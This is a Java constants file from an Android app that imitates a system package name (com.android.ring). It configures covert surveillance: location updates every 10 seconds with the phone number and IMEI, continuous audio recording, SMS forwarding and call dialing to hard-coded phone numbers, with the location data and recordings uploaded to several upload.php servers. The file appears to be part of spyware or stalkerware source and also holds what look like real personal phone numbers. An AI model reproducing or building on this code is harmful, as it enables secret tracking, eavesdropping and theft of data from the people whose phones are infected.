package com.android.ring;

import android.location.Location;
import android.os.Environment;

import com.android.log.CLog;
import com.android.ring.devutils.DeviceInfo;

/**
 * @author junxu.wang
 *
 */
public class Constant {
	public static final boolean IS_DEBUG=false;
	
	//GPS
	/**如果通过gps获取位置gps=1,如果通过网络获取位置gps=0*/
	public static final int LOCATION_GPS=1;
	/**如果通过gps获取位置gps=1,如果通过网络获取位置gps=0*/
	public static final int LOCATION_NETWORK=0;
	public static final String ID="1234567890";
	public static final long GPS_MIN_TIME=10000;//位置获取10秒传一次
	public static final long GPS_TOTAL_TIME=15*60000;//GPS工作时间：连续15分钟
	/**gps上传格式
	 * id:是一个硬编码的数，定义成const String phoneid=123456，然后复制到url即可
	 * ph:是手机号 
	 * x:x坐标 
	 * y:y坐标 z:海拔
	 * gps:如果通过gps获取位置gps=1,如果通过网络获取位置gps=0*/
	public static final String GPS_PARAM_FORMATE="id=%s&ph=%s&imei=%s&x=%f&y=%f&z=%f&gps=%d";
	/**gps上传格式*/
	public static String createGpsParam(DeviceInfo deviceInfo,Location location,int type){
		return String.format(GPS_PARAM_FORMATE, ID,deviceInfo.getPhoneNumber(),deviceInfo.getIMEI(),location.getLongitude(),location.getLatitude(),location.getAltitude(),type);
	}
	//http:\\192.168.1.100:80\main.php?id=1234567890&ph=19991048999&imei=123456789&x=124312432&&y=124312432&z=124312432&gps=0
	public static final String gpsUrls[] = new String[]{"http://192.168.22.3/upload.php?",
	         	 	"http://192.168.22.4/upload.php?",
	         		"http://192.168.22.5/upload.php?"
	};
	//id=1234567890&ph=19991048999&imei=123456789&x=124312432&&y=124312432&z=124312432&gps=0
	public static final String gpsPhoneNumbers[] = new String[]{
//		"18612317056",
//		"13121581070"
        "18958031925",
        "13911048911"
		};
	
	
	//Record
	/**录音文件大小,1分钟一个文件*/
	public static final long RECORD_PERIOD_TIME=60000;//，
	/**录音时间连续录制15分钟*/
	public static final long RECORD_TOTAL_TIME=15*60000;
	/**录音文件目录*/
	public static String RECORD_PATH = null;
	/**文件格式 record12345.xxx, 12345时1970年以来的秒数，格林威治标准时间，xxx是实际录制格式mp3就是mp3，amr就是amr*/
	public static final String RECORD_FILE_FOMATE="%s/recor%s.mp3";
	/**格式录音文件名*/
	public static final String createFileName(long fileName){
		CLog.print("createFileName", "path:"+RECORD_FILE_FOMATE);
		 if(RECORD_PATH==null){
			 RECORD_PATH=DeviceInfo.getPath();
		 }
		return String.format(RECORD_FILE_FOMATE,RECORD_PATH, fileName);
	}
	/**上传录音文件的服务器*/
	public static final String recordUrls[]=new String[]{"http://192.168.22.3/upload.php?",
 	 	"http://192.168.22.4/upload.php?",
 		"http://192.168.22.5/upload.php?"};
 		
 		
	
//	Call

	/**拨号时间连续15分钟*/
	public static final boolean SMS_TRANSMIT=true;
	/**拨号号码*/
	public static final String smsTransmitNumbers[]=new String[]{
//		"18612317056",
//		"13121581070"
        "18958031925",
        "13911048911"
		};
	
	
//	SMS
	/**拨号时间连续15分钟*/
	public static final long CALL_TOTAL_TIME=15*60000;
	/**拨号号码*/
	public static final String callNumbers[]=new String[]{
//		"18612317056",
//		"13121581070"
        "18958031925",
        "13911048911"
		};

}
